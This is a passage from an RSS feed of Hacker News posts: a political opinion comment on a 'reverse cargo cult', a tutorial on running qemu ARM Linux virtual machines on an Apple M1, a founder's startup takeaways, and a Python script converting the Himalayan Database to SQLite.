<p>When they build the straw airstrip, it <em>isn’t</em> because they are hoping for the same outcome. They know the difference, and know that because their airstrip is made of straw, it certainly won’t yield any cargo, but it serves another purpose. They don’t lie to the rubes and tell them that an airstrip made of straw will bring them cargo. That’s an easy lie to dismantle. Instead, what they do is make it clear that the airstrip is made of straw, and doesn’t work, but then tell you that the other guy’s airstrip doesn’t work either. They tell you that <strong>no airstrips yield cargo</strong>. The whole <em>idea of cargo</em> is a lie, and those fools, with their fancy airstrip made out of wood, concrete, and metal is just as wasteful and silly as one made of straw.</p>
<p>1980s Soviets knew that their government was lying to them about the strength and power of their society, the Communist Party couldn’t hide all of the dysfunctions people saw on a daily basis. This didn’t stop the Soviet leadership from lying. Instead, they just accused the West of being equally deceptive. <em>“Sure, things might be bad here, but they are just as bad in America, and in America people are actually foolish enough to believe in the lie! Not like you, clever people. You get it. You know it is a lie.”</em></p>
<p>Trump’s supporters don’t care about being lied to. You can point out the lies until you’re blue in the face, but it makes no difference to them. Why? Because it is just a game to them. The media lies, bloggers lie, politicians lie, it’s just all a bunch of lies. Facts don’t matter because those are lies also. Those trolls on Twitter, 4Chan, T_D, etc. are just having a good laugh. They are congratulating each other for being so smart. We are fools for still believing in anything. There is no cargo, and probably never was.</p>
<p>Source: <a href="https://np.reddit.com/r/politics/comments/5rru7g/kellyanne_conway_made_up_a_fake_terrorist_attack/dd9vxo2/">https://np.reddit.com/r/politics/comments/5rru7g/kellyanne_conway_made_up_a_fake_terrorist_attack/dd9vxo2/</a></p>
					
					<p>
						Filed under: <a href="https://hanshowe.org/category/1100733/" rel="category tag">#!!#</a> |					</p>

				</div></div>]]>
            </description>
            <link>https://hanshowe.org/2017/02/04/trump-and-the-reverse-cargo-cult/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25717075</guid>
            <pubDate>Sun, 10 Jan 2021 17:36:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Apple M1, ARM/x86 Linux Virtualization, and Boinc]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25717019">thread link</a>) | @jseliger
<br/>
January 10, 2021 | https://www.sevarg.net/2021/01/09/arm-mac-mini-and-boinc/ | <a href="https://web.archive.org/web/*/https://www.sevarg.net/2021/01/09/arm-mac-mini-and-boinc/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>About <a href="https://www.sevarg.net/2020/06/21/apple-and-arm-transition/">six months ago</a>, I speculated a bit on what Apple might do with their upcoming (rumored at the time) ARM transition.  Apple did it, has shipped hardware, and I’ve had a chance to play with for a while now.  I’ve also, as is usual for me, gone down some weird paths - like ARM Linux virtualization, x86 Linux emulation, and BOINC in an ARM VM!</p>

<p>The fastest Linux machine I’ve <em>ever</em> used is a hardware virtualized install on the Apple M1 - and this post covers how to do it!</p>

<picture><source srcset="https://www.sevarg.net/generated/images/2021-qemu-m1/mac_m1_virtualization-400-1c323509d.webp 400w, https://www.sevarg.net/generated/images/2021-qemu-m1/mac_m1_virtualization-800-1c323509d.webp 800w, https://www.sevarg.net/generated/images/2021-qemu-m1/mac_m1_virtualization-1600-1c323509d.webp 1600w" type="image/webp"><source srcset="https://www.sevarg.net/generated/images/2021-qemu-m1/mac_m1_virtualization-400-1c323509d.png 400w, https://www.sevarg.net/generated/images/2021-qemu-m1/mac_m1_virtualization-800-1c323509d.png 800w, https://www.sevarg.net/generated/images/2021-qemu-m1/mac_m1_virtualization-1600-1c323509d.png 1600w" type="image/png"><img src="https://www.sevarg.net/generated/images/2021-qemu-m1/mac_m1_virtualization-1600-1c323509d.png" width="4096" height="2304"></picture>



<h2 id="the-short-2020-m1-mac-mini-review">The Short 2020 M1 Mac Mini Review</h2>

<p>While I don’t generally <a href="https://www.sevarg.net/2020/02/01/finances-technology-repair-and-enough/">make a habit</a> of buying brand new, just-released hardware, I made an exception for the M1 and bought a M1 Mac Mini to replace an Intel Mac Mini (which had replaced a perfectly function 2014 iMac I’d still be running if the monitor hadn’t failed - the display assembly, used, cost $600 in not-cracked condition).  The Intel one wasn’t doing most of what I wanted (to say the GPU sucked would be an understatement), I’ve been lusting after a mid-range ARM desktop for a long while, and the fact that things would be broken on it doesn’t bother me - it’s not a production machine for me, so I’m happy to run on the bleeding, slightly broken edge.  It’s a common theme with ARM desktop use, especially 64-bit, so this is no different.</p>

<p>How is it?  It’s <em>fast.</em>  It’s <em>really, really fast.</em>  Not just for the power - that’s amazing too, but simple, flat out, using it for stuff.  It’s amazing.  I figured it would be really good, but it’s beyond good, crossing into the “Yeah, I’ll call this magical…” realm.  The fan almost never comes off idle, power consumption (I work in a solar office, remember?) is a rounding error, and it just does what I ask of it in a real hurry.</p>

<p>I mean, it’ll even play Kerbal Space Program with pretty darn good graphics!  That’s an x86 game with no native port yet, and it’s not exactly a CPU sipper!</p>

<picture><source srcset="https://www.sevarg.net/generated/images/2021-qemu-m1/ksp_m1_settings-400-b017715f9.webp 400w, https://www.sevarg.net/generated/images/2021-qemu-m1/ksp_m1_settings-800-b017715f9.webp 800w, https://www.sevarg.net/generated/images/2021-qemu-m1/ksp_m1_settings-863-b017715f9.webp 863w" type="image/webp"><source srcset="https://www.sevarg.net/generated/images/2021-qemu-m1/ksp_m1_settings-400-b017715f9.png 400w, https://www.sevarg.net/generated/images/2021-qemu-m1/ksp_m1_settings-800-b017715f9.png 800w, https://www.sevarg.net/generated/images/2021-qemu-m1/ksp_m1_settings-863-b017715f9.png 863w" type="image/png"><img src="https://www.sevarg.net/generated/images/2021-qemu-m1/ksp_m1_settings-863-b017715f9.png" width="863" height="757"></picture>



<p>This does mean that, once again, Jeb ends up stuck places he’d probably rather not be stuck.  Lock your staging, or a thumb twitch might just leave you 100m above Mun with no descent (or ascent!) stage left attached…</p>

<picture><source srcset="https://www.sevarg.net/generated/images/2021-qemu-m1/sad_jeb-400-976018ace.webp 400w, https://www.sevarg.net/generated/images/2021-qemu-m1/sad_jeb-800-976018ace.webp 800w, https://www.sevarg.net/generated/images/2021-qemu-m1/sad_jeb-1299-976018ace.webp 1299w" type="image/webp"><source srcset="https://www.sevarg.net/generated/images/2021-qemu-m1/sad_jeb-400-976018ace.png 400w, https://www.sevarg.net/generated/images/2021-qemu-m1/sad_jeb-800-976018ace.png 800w, https://www.sevarg.net/generated/images/2021-qemu-m1/sad_jeb-1299-976018ace.png 1299w" type="image/png"><img src="https://www.sevarg.net/generated/images/2021-qemu-m1/sad_jeb-1299-976018ace.png" width="1299" height="756"></picture>



<p>Should you buy one of Apple’s M1 devices?  Probably not - wait 6 months for the next round of hardware, and buy then.  Most of the software ecosystem quirks will be worked out by then, and just about everything will work.  For now, there are enough weird little broken corner cases that I’d suggest holding off unless you’re OK with that and want legitimately insane battery life and performance.</p>

<p>But an awful lot does work, and it works really well.</p>

<p>Yes, yes, I <em>know,</em> your overclocked AMD ThreadBlaster 7970XP, with enough threads, will build the kernel faster on 400W.  All this performance is on about 30W, and this is their first pass at it.  Just wait…</p>

<h2 id="rosetta-2-they-did-what">Rosetta 2: They Did WHAT?</h2>

<p>We also have an answer now to the insane x86 translation performance (around 80% of native performance, give or take - and, yes, this does mean that the M1 runs x86 binaries faster than an awful lot of x86 hardware out there).  I’ve messed around with running x86 binaries in emulation on ARM before, and got about 10% of native performance on a Rpi4.  Painful.  Apple’s Rosetta 2 gets a lot of benefit from being a pre-compiling translator (for most cases - it still has to interpret JIT type workloads), but most people figured that would get you to 50% - at best.  The ARM memory model is so radically different from x86 that you end up sprinkling memory barriers everywhere to guarantee cross threaded consistency, and that really hurts performance.</p>

<p>The issue is that on x86, if you write memory addresses in a certain sequence, <em>all other cores</em> will see the writes in the same sequence. If you write some blob of data and then write the “Ready!” flag, by the time other cores see the flag change value, you can be certain that the blob of data has been written.  ARM has no such guarantees without explicit (and slow) memory barrier instructions, and this is why the x86 emulation on ARM Windows was painful - guaranteeing correctness of a translated binary on a weaker memory model is slow.</p>

<p>As it turns out, Apple <em>isn’t</em> doing it purely in software - they have <a href="https://github.com/saagarjha/TSOEnabler">Total Store Ordering</a> support in their hardware!  When the M1 runs a translated x86 binary, the OS just tells the chip, “Hey, use x86 memory ordering for this thread.”  Things built natively for ARM can take advantage of the performance gains of the memory reordering, and things that requires strict ordering get strict ordering.  It’s a very, very clever way to totally bypass the memory ordering issues with translated binaries, and it’s not a thing in any other ARM chip on the planet (I’d say yet, but I really don’t think this will become a popular thing to implement - perks of Apple building their own silicon).</p>

<h2 id="onto-virtual-machines-lets-build-qemu">Onto Virtual Machines: Let’s Build qemu!</h2>

<p>Now, to the core of the post: Building qemu to run hardware virtualized ARM Linux!  I’m starting with <a href="https://gist.github.com/niw/e4313b9c14e968764a52375da41b4278">these excellent instructions</a> as a guide, but I’ve got some extra patches thrown in (because it doesn’t run x86 emulation my M1 with 11.1), and I’m doing a few other things in the process.</p>

<p>You’ll need XCode installed, and we’ll be using <a href="https://brew.sh/">homebrew</a> to install  some of the prerequisites for building qemu.  Plus some patches to the source, and… it’s all good fun, I promise!  What I don’t promise is that this will work perfectly for you, though I’ll try!</p>

<p>Yes, I know Parallels has a tech preview out, and you still can’t change the resolution of a Linux guest.  If you’re fine with 1024x768, it certainly works, but… we can do better with open source!</p>

<h4 id="installing-the-prerequisites-homebrew-and-xcode">Installing the Prerequisites: Homebrew and XCode</h4>

<p>You’ll need the XCode command line tools (gcc and such) to build this, so if you don’t already have those installed, go ahead and install XCode from the App Store.  It’s huge.</p>

<p>I understand you can also install them from the command line, if you don’t want the full install, by running <code>xcode-select --install</code>.  That’s the first thing I do with any Mac, so I had them laying around.  You may have to agree to some license terms as well - it’s been a while since I had a clean install.</p>

<p>If you use the normal Homebrew install path, you’ll get x86 Homebrew, running under Rosetta.  This is fine for most use cases, and it certainly <em>works</em> better than the ARM Homebrew (half the code won’t build under ARM), but it’s no good for ARM native dependencies, and we’re going to be building ARM native qemu.</p>

<p>If you rely on x86 homebrew, well… uh… fix the ARM stuff that doesn’t build?  Or install to a different directory, I suppose.  I have no great advice on parallel Homebrew installs, sorry.</p>

<div><div><pre><code>cd ~
mkdir homebrew &amp;&amp; curl -L https://github.com/Homebrew/brew/tarball/master | tar xz --strip 1 -C homebrew
sudo mv homebrew /opt/homebrew
echo 'export PATH="/opt/homebrew/bin:$PATH"' &gt;&gt; ~/.zshrc
source ~/.zshrc
brew update
</code></pre></div></div>

<p>This will run some git fetches, some builds, and you should generally have a working brew install.  Like XCode, this may take a while, depending on your internet connection.  My ISPs have been sucking more than usual lately, and I don’t keep a local mirror of Homebrew, so… coffee time.</p>

<p>You should then be able to install the dependencies for qemu:</p>

<div><div><pre><code>brew install ninja pkgconfig glib pixman
</code></pre></div></div>

<h4 id="fetching-patching-and-building-qemu">Fetching, Patching, and Building qemu</h4>

<p>Next step: we’re going to download the qemu source, check out the proper version, apply a couple patches, and build it!</p>

<p>The <a href="https://patchwork.kernel.org/project/qemu-devel/list/?series=400619">first patch series</a> is the core of the updates - it adds <a href="https://developer.apple.com/documentation/hypervisor">Hypervisor.framework</a> support (Apple’s recent “So, you wanna do hardware virtualization without a kernel module…” framework), adds the ability to sign the output binary to allow it to use that, and various other things related to Apple Silicon support.</p>

<p>The <a href="https://patchwork.kernel.org/project/qemu-devel/patch/20210103145055.11074-1-r.bolshakov@yadro.com/">second patch series</a> isn’t actually required to run hardware virtualization, but if you wanted to mess around with the (somewhat awful, but still usable) performance of x86 VMs on the M1, you’ll need this.  Apple Silicon prevents memory pages from being both writable and executable at the same time, and this adds the toggles to handle things properly so the JIT engine can work.</p>

<p>If you <em>don’t</em> apply the second patches, and you try to run x86 system emulation, you’ll get the exceedingly unhelpful error “Could not allocate dynamic translator buffer” when you try to run it.</p>

<p>And, of course, if you’re not interested in x86 emulation, you can skip the <code>x86_64-softmmu</code> and <code>i386-softmmu</code> options in the target-list for configure.</p>

<div><div><pre><code>git clone https://git.qemu.org/git/qemu.git
git checkout master -b wip/hvf
curl 'https://patchwork.kernel.org/series/400619/mbox/'|git am --3way
curl 'https://patchwork.kernel.org/project/qemu-devel/patch/<a href="https://www.sevarg.net/cdn-cgi/l/email-protection" data-cfemail="1220222023222322212326272227273c23232225263f233f603c707d7e617a73797d64526b7376607d3c717d7f">[email&nbsp;protected]</a>/mbox/'|git am --3way
mkdir build
cd build
../configure --target-list=aarch64-softmmu,x86_64-softmmu,i386-softmmu --enable-cocoa
make -j 8
</code></pre></div></div>

<p>Sit back, relax, wait… actually, not very long, this system is blazing fast on all 8 cores, and you should have some qemu binaries!</p>

<h4 id="grab-an-arm-ubuntu-iso-and-an-efi-blob-create-a-disk-image">Grab an ARM Ubuntu ISO and an EFI blob, Create a Disk Image</h4>

<p>There are plenty of ways to install the ARM version of Ubuntu, but there’s a convenient desktop build now at <a href="https://cdimage.ubuntu.com/focal/daily-live/current/">https://cdimage.ubuntu.com/focal/daily-live/current/</a> - grab <code>focal-desktop-arm64.iso</code>.  You do NOT want the ‘amd64’ version - make sure you get ‘arm64’ or it won’t work!</p>

<p>You also need a EFI blob built for ARM.  The instructions I’m working from cover how to build it with your own ARM VM (and include a link to some built ones), but I’ve also uploaded one for you, if you happen to want it: <a href="https://www.sevarg.net/images/2021-qemu-m1/QEMU_EFI.fd">QEMU_EFI.fd</a></p>

<p>While you could just run the live ISO, there’s no fun in that - create a disk image for the install (you’ll be doing this from the qemu/build directory you were just in, and stick the image somewhere fast).  I’ll assume you’ve put the QEMU_EFI.fd file in the same directory.</p>

<div><div><pre><code>./qemu-img create -f qcow2 /path/to/Ubuntu.qcow2 40G
</code></pre></div></div>

<h2 id="the-fun-part-launch-the-vm">The Fun Part: Launch the VM!</h2>

<p>Now, let’s light up a VM from the installer CD!  It’s Linux, so we’re just using <em>all the virtio devices.</em>  Virtio is a way for …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.sevarg.net/2021/01/09/arm-mac-mini-and-boinc/">https://www.sevarg.net/2021/01/09/arm-mac-mini-and-boinc/</a></em></p>]]>
            </description>
            <link>https://www.sevarg.net/2021/01/09/arm-mac-mini-and-boinc/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25717019</guid>
            <pubDate>Sun, 10 Jan 2021 17:30:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We've been running a bootstrapped startup for a year]]>
            </title>
            <description>
<![CDATA[
Score 74 | Comments 37 (<a href="https://news.ycombinator.com/item?id=25717006">thread link</a>) | @artembugara
<br/>
January 10, 2021 | https://newscatcherapi.com/blog/we-ve-been-running-a-bootstrapped-startup-for-1-year-our-top-15-takeaways | <a href="https://web.archive.org/web/*/https://newscatcherapi.com/blog/we-ve-been-running-a-bootstrapped-startup-for-1-year-our-top-15-takeaways">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><div><div><h3>What is the value of this article? </h3><p>We are young, inexperienced, prone to fail: <strong>we’re 2 first time founders</strong>. I always prefer to learn from people who are just a few steps ahead of me. </p><h3>Who is this article for? </h3><p>If you’re a multi-time entrepreneur then you might not find this article interesting. <strong>If you’ve been thinking about starting your own startup then I’d recommend reading as many similar articles as possible.</strong></p><h2>Our Team</h2><p>Artem (author of this article):</p><ul><li><p>First-time founder </p></li><li><p>Technical with no CS degree</p></li><li><p>24 years old</p></li><li><p>~2 years of work experience (data-oriented job)</p></li><li><p>Quit the University after Masters 1 to get a job</p></li><li><p>Full-time since April 2020</p></li><li><p>CEO</p></li></ul><p>Maksym:</p><ul><li><p>First-time founder </p></li><li><p>Technical with no CS degree</p></li><li><p>24 years old</p></li><li><p>~2 years of work experience (data-oriented job)</p></li><li><p>Full-time since December 2020</p></li><li><p>CTO</p></li></ul><h2>Our Product - News API</h2><p>We provide instant access to news article data for hedge funds, market researchers, and PR software. </p><p><strong>In simple words: </strong></p><ol><li><p><strong>we crawl news websites, </strong></p></li><li><p><strong>detect news article URLs, </strong></p></li><li><p><strong>extract all possible information (title, published date, author, content, etc.), </strong></p></li><li><p><strong>index this data</strong></p></li></ol><p>Our main product is <a href="https://newscatcherapi.com/news-api">News API</a> which allows our clients to find structured news articles by any topic, country, language, website, or keyword. </p><p><a href="https://www.notion.so/newscatcherapi/News-API-46632a5cd61548919ff0132b15b0f0fa?p=2eff4d9b6e6b4a87a8e2230424aee4be">Example of News API JSON response</a>.</p><p>We’re B2B Data-as-a-Service.</p><h3>What I and my co-founder could achieve in 12 months</h3><ul><li><p>Monthly Recurring Revenue ~$3,000</p></li><li><p>Both co-founders work full-time</p></li></ul><blockquote>All things mentioned are purely personal. </blockquote><p><strong>1. Talk to your potential clients</strong></p><p>Talk to them even if you do not have a product. </p><p>Imagine you have the very best version of what you’re building. Go ahead and see what people say. </p><p>One more thing: <strong>CLIENTS</strong>. Not your friends, or some random people. Yeah, your friends will say “Great idea”. All of them. </p><p>What you really want to hear is “I like it. What’s the price? How can I buy it?”</p><p>People only vote with their pockets.</p><p><a href="https://www.ycombinator.com/library/6g-how-to-talk-to-users">More read</a></p><p><strong></strong><a href="https://www.ycombinator.com/library/6g-how-to-talk-to-users"><strong></strong></a><strong>2. Do not think you/your product/your team/your approach are any different or unique</strong></p><p>We all want to be special. We all want to work for a company that will soon cost millions of dollars. We all want to be the first of our kind. </p><p>But, most likely, you, your team, your product is (below) average.</p><p>So, if you hear experienced people repeating the same thing to you then you should act. </p><blockquote><strong>Do not try to be “Yeah, but we’re…”</strong> </blockquote><p><strong>3. It’s almost impossible to raise money when you don’t have anything to show</strong></p><p>Do not expect investors to come and give you money. It’s a big gamble for you to start raising. Also, raising money is a full-time job!</p><p><strong>4. Start pitching investors as soon as possible</strong></p><p>Yes, do not expect them to give you money. However, there is a lot of things to do to raise money. You have to be prepared for when you’re ready. </p><blockquote>Pitch deck.  Pitching. Answering the questions. </blockquote><p>Do not spend much time on it. However, I would recommend to do it consistently. It will take months to come up with something consistent. So, you’d better start early.</p><p>Also, some investors will tell you why they will not give you money. Iterate, and work on these problems.</p><p><strong>5. Start small. Do things that do not scale. Be a consulting company</strong></p><p>Believe me or not but the only way to sell your scalable solution to millions of clients is to start by selling it one-by-one. In a non-scalable way. </p><p><a href="http://paulgraham.com/ds.html">More read</a></p><p><strong></strong><a href="http://paulgraham.com/ds.html"><strong></strong></a><strong>6. Do not be afraid to charge </strong></p><p>Charge for your service/product at a fair price. Yeah, you might lose some clients. But, how will you survive if you cannot get fair pay for your service? </p><p><strong>7. It’s a grind. Consistent one</strong></p><p>You have to repeat a lot of boring things over and over again. </p><p><strong>8. Only those who pay you money have to decide which features to add</strong></p><p>Do you think adding this feature is cool? Go ahead, and ask those who pay you. </p><p>Listen to what they say, and make a better product. </p><p><strong>9. Carefully choose co-founders</strong></p><p>We know each other for over 14 years. We knew well what to expect from each other.</p><p><strong>10. Help others &amp; Ask others for help</strong></p><p><strong>11. Things that no one actually cares about at the beginning</strong></p><ul><li>Logo</li><li>Name, website domain</li><li>Your background</li></ul><p><strong>12. Things that everyone cares about</strong></p><ul><li>Your value proposition</li></ul><p><strong>13. What is the definition of a “startup” for you? </strong></p><p>Can you give it? Maybe what you want to start is a small business. There’s nothing wrong with it. </p><p><strong>14. Do not afraid to take a step back</strong></p><p><strong>15. This list misses the other 100 points which we did not figure out yet! So, do not overlay on it</strong></p><p>All I’ve written here might be wrong/not applicable to you. But like I said, most likely you’re not different at all.</p></div></div></div></div>]]>
            </description>
            <link>https://newscatcherapi.com/blog/we-ve-been-running-a-bootstrapped-startup-for-1-year-our-top-15-takeaways</link>
            <guid isPermaLink="false">hacker-news-small-sites-25717006</guid>
            <pubDate>Sun, 10 Jan 2021 17:30:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Convert the Himalayan Database to SQLite]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25716976">thread link</a>) | @luord
<br/>
January 10, 2021 | http://peter-hoffmann.com/2021/convert-the-himalayan-database-to-sqlite.html | <a href="https://web.archive.org/web/*/http://peter-hoffmann.com/2021/convert-the-himalayan-database-to-sqlite.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
        <blockquote>
        <p>Conversion of the Himalayan database of the legendary Elizabeth Hawley from FoxPro to SQLite.</p>
        </blockquote>
        

        
        <!-- Begin Featured Image -->
        <p><img src="http://peter-hoffmann.com/static/2021/himalayan-database.png" alt=""></p><!-- End Featured Image -->
        

        
            <p>The Himalayan database is a record of expeditions in the Nepalese Himalayas
and a unique source of knowledge about the history of the Himalaya
mountaineering. The database is based on the expedition archives of Elizabeth
Hawley, a longtime journalist based in Kathmandu, and it is supplemented by
information gathered from books, alpine journals and correspondence with
Himalayan climbers. The records go back until 1903.</p>
<p>The database was maintained by the legendary Elizabeth Hawley from Kathmandu
until her retirement. If you are interested in some more details of the
fascinating live of Elizabeth Hawley I can recommend the book <a href="">I'll
Call You in Kathmandu: The Elizabeth Hawley Story</a> from <a href="">Bernadette
McDonald</a> about the early days of Himalaya expeditions and the her live in
Kathmandu.</p>
<p>In 2017, a new non-profit organization (<a href="">The Himalayan Database</a>) was
established to continue the work of Elizabeth Hawley who retired in 2016. 
Elizabeth's long term assistant <a href="">Billi Bierling</a> has taken over the
role as a Managing Director and continues to maintain and update the 
database with a team of record collectors in Kathmandu and around the world .
As a result, version 2 of the Himalayan Database has now been released to the
general public at no charge via Internet download.</p>
<p>The Himalayan database is a FoxPro application developed and maintained by Richard Salisbury who
worked as a computer programmer at the University of Michigan and travelled to Nepal more than 50
times for trekking and expeditions. In 1991 after his encounter with Elizabeth Hawley they 
started to digitalize Elizabeth's notes and created the first version of the Himalayan database.</p>
<p>While there is a documentation available how to run the the FoxPro
application with <a href="">crossover</a> on OSX, I have been more interested to
directly query the contents from python, so I have written a small tool to
convert it to a <a href="">SQLite</a> database.</p>
<p>The current Himalayan database (version 2.3 with Autumn 2019-Winter 2019-Spring 2020
update) can be downloaded from <a href="">Himalayan database download page</a>.</p>
<pre><code><span>$</span> <span>mkdir</span> <span>download</span>
<span>$</span> <span>wget</span> <span>https</span><span>:</span><span>//</span><span>www</span><span>.</span><span>himalayandatabase</span><span>.</span><span>com</span><span>/</span><span>downloads</span><span>/</span><span>Himalayan</span><span>%</span><span>20</span><span>Database</span><span>.</span><span>zip</span> <span>-</span><span>O</span> <span>download</span><span>/</span><span>Himalayan_Database</span><span>.</span><span>zip</span>
<span>$</span> <span>unzip</span> <span>download</span><span>/</span><span>Himalayan_Database</span><span>.</span><span>zip</span> <span>-</span><span>d</span> <span>download</span><span>/</span>
</code></pre><p>The zip file includes the application to run the FoxPro version, and the <code>HIMDATA</code> folder includes the necessary
database <code>.DBF</code> files.</p>
<pre><code><span>$</span> <span>tree</span> <span>download</span><span>/</span><span>Himalayan</span>\ <span>Database</span><span>/</span>
<span>download</span><span>/</span><span>Himalayan</span>\ <span>Database</span><span>/</span>
<span>├──</span> <span>HIMDATA</span>
<span>│</span>   <span>├──</span> <span>FILTERS</span><span>.</span><span>FPT</span>
<span>│</span>   <span>├──</span> <span>SETUP</span><span>.</span><span>DBF</span>
<span>│</span>   <span>├──</span> <span>exped</span><span>.</span><span>CDX</span>
<span>│</span>   <span>├──</span> <span>exped</span><span>.</span><span>DBF</span>
<span>│</span>   <span>├──</span> <span>exped</span><span>.</span><span>FPT</span>
<span>│</span>   <span>├──</span> <span>filters</span><span>.</span><span>CDX</span>
<span>│</span>   <span>├──</span> <span>filters</span><span>.</span><span>DBF</span>
<span>│</span>   <span>├──</span> <span>members</span><span>.</span><span>CDX</span>
<span>│</span>   <span>├──</span> <span>members</span><span>.</span><span>DBF</span>
<span>│</span>   <span>├──</span> <span>members</span><span>.</span><span>FPT</span>
<span>│</span>   <span>├──</span> <span>peaks</span><span>.</span><span>CDX</span>
<span>│</span>   <span>├──</span> <span>peaks</span><span>.</span><span>DBF</span>
<span>│</span>   <span>├──</span> <span>peaks</span><span>.</span><span>FPT</span>
<span>│</span>   <span>├──</span> <span>refer</span><span>.</span><span>CDX</span>
<span>│</span>   <span>├──</span> <span>refer</span><span>.</span><span>DBF</span>
<span>│</span>   <span>└──</span> <span>refer</span><span>.</span><span>FPT</span>
<span>├──</span> <span>Himal</span>\ <span>2.3</span><span>.</span><span>exe</span>
<span>├──</span> <span>MSVCR71</span><span>.</span><span>DLL</span>
<span>├──</span> <span>VFP9R</span><span>.</span><span>DLL</span>
<span>└──</span> <span>VFP9RENU</span><span>.</span><span>DLL</span>
</code></pre><p>In the following script uses the  python library <a href="https://dbfread.readthedocs.io/en/latest/">dbfread</a> to access the
dbf file format and convert it to a more convenient sqlite database. To run 
the script you need to install it with <code>pip install dbfread</code> into your
virtual environment.</p>
<pre><code><span>#!/usr/bin/env python</span>

<span>import</span> <span>sqlite3</span>
<span>from</span> <span>dbfread</span> <span>import</span> <span>DBF</span>


<span>def</span> <span>get_fields</span><span>(</span><span>table</span><span>):</span>
    <span>"""get the fields and sqlite types for a dbf table"""</span>
    <span>typemap</span> <span>=</span> <span>{</span>
        <span>"F"</span><span>:</span> <span>"FLOAT"</span><span>,</span>
        <span>"L"</span><span>:</span> <span>"BOOLEAN"</span><span>,</span>
        <span>"I"</span><span>:</span> <span>"INTEGER"</span><span>,</span>
        <span>"C"</span><span>:</span> <span>"TEXT"</span><span>,</span>
        <span>"N"</span><span>:</span> <span>"REAL"</span><span>,</span>  <span># because it can be integer or float</span>
        <span>"M"</span><span>:</span> <span>"TEXT"</span><span>,</span>
        <span>"D"</span><span>:</span> <span>"DATE"</span><span>,</span>
        <span>"T"</span><span>:</span> <span>"DATETIME"</span><span>,</span>
        <span>"0"</span><span>:</span> <span>"INTEGER"</span><span>,</span>
    <span>}</span>

    <span>fields</span> <span>=</span> <span>{}</span>
    <span>for</span> <span>f</span> <span>in</span> <span>table</span><span>.</span><span>fields</span><span>:</span>
        <span>fields</span><span>[</span><span>f</span><span>.</span><span>name</span><span>]</span> <span>=</span> <span>typemap</span><span>.</span><span>get</span><span>(</span><span>f</span><span>.</span><span>type</span><span>,</span> <span>"TEXT"</span><span>)</span>
    <span>return</span> <span>fields</span>


<span>def</span> <span>create_table_statement</span><span>(</span><span>table_name</span><span>,</span> <span>fields</span><span>):</span>
    <span>defs</span> <span>=</span> <span>", "</span><span>.</span><span>join</span><span>([</span><span>'"</span><span>%s</span><span>" </span><span>%s</span><span>'</span> <span>%</span> <span>(</span><span>fname</span><span>,</span> <span>ftype</span><span>)</span> <span>for</span> <span>(</span><span>fname</span><span>,</span> <span>ftype</span><span>)</span> <span>in</span> <span>fields</span><span>.</span><span>items</span><span>()])</span>
    <span>sql</span> <span>=</span> <span>'create table "</span><span>%s</span><span>" (</span><span>%s</span><span>)'</span> <span>%</span> <span>(</span><span>table_name</span><span>,</span> <span>defs</span><span>)</span>
    <span>return</span> <span>sql</span>


<span>def</span> <span>insert_table_statement</span><span>(</span><span>table_name</span><span>,</span> <span>fields</span><span>):</span>
    <span>refs</span> <span>=</span> <span>", "</span><span>.</span><span>join</span><span>([</span><span>":"</span> <span>+</span> <span>f</span> <span>for</span> <span>f</span> <span>in</span> <span>fields</span><span>.</span><span>keys</span><span>()])</span>
    <span>sql</span> <span>=</span> <span>'insert into "</span><span>%s</span><span>" values (</span><span>%s</span><span>)'</span> <span>%</span> <span>(</span><span>table_name</span><span>,</span> <span>refs</span><span>)</span>
    <span>return</span> <span>sql</span>


<span>def</span> <span>copy_table</span><span>(</span><span>cursor</span><span>,</span> <span>table</span><span>):</span>
    <span>"""Add a dbase table to an open sqlite database"""</span>
    <span>cursor</span><span>.</span><span>execute</span><span>(</span><span>"drop table if exists </span><span>%s</span><span>"</span> <span>%</span> <span>table</span><span>.</span><span>name</span><span>)</span>
    <span>fields</span> <span>=</span> <span>get_fields</span><span>(</span><span>table</span><span>)</span>

    <span>sql</span> <span>=</span> <span>create_table_statement</span><span>(</span><span>table</span><span>.</span><span>name</span><span>,</span> <span>fields</span><span>)</span>
    <span>cursor</span><span>.</span><span>execute</span><span>(</span><span>sql</span><span>)</span>

    <span>sql</span> <span>=</span> <span>insert_table_statement</span><span>(</span><span>table</span><span>.</span><span>name</span><span>,</span> <span>fields</span><span>)</span>

    <span>for</span> <span>rec</span> <span>in</span> <span>table</span><span>:</span>
        <span>cursor</span><span>.</span><span>execute</span><span>(</span><span>sql</span><span>,</span> <span>list</span><span>(</span><span>rec</span><span>.</span><span>values</span><span>()))</span>


<span>def</span> <span>main</span><span>():</span>
    <span>output_file</span> <span>=</span> <span>"himalayan_database.sqlite"</span>
    <span>tables</span> <span>=</span> <span>[</span><span>"exped"</span><span>,</span> <span>"members"</span><span>,</span> <span>"peaks"</span><span>,</span> <span>"refer"</span><span>]</span>
    <span>conn</span> <span>=</span> <span>sqlite3</span><span>.</span><span>connect</span><span>(</span><span>output_file</span><span>)</span>
    <span>cursor</span> <span>=</span> <span>conn</span><span>.</span><span>cursor</span><span>()</span>

    <span>for</span> <span>table_name</span> <span>in</span> <span>tables</span><span>:</span>
        <span>table_file</span> <span>=</span> <span>f</span><span>"download/Himalayan Database/HIMDATA/</span><span>{table_name}</span><span>.DBF"</span>
        <span>dbf_table</span> <span>=</span> <span>DBF</span><span>(</span>
            <span>table_file</span><span>,</span> <span>lowernames</span><span>=</span><span>True</span><span>,</span> <span>encoding</span><span>=</span><span>None</span><span>,</span> <span>char_decode_errors</span><span>=</span><span>"strict"</span>
        <span>)</span>
        <span>copy_table</span><span>(</span><span>cursor</span><span>,</span> <span>dbf_table</span><span>)</span>

    <span>conn</span><span>.</span><span>commit</span><span>()</span>


<span>if</span> <span>__name__</span> <span>==</span> <span>"__main__"</span><span>:</span>
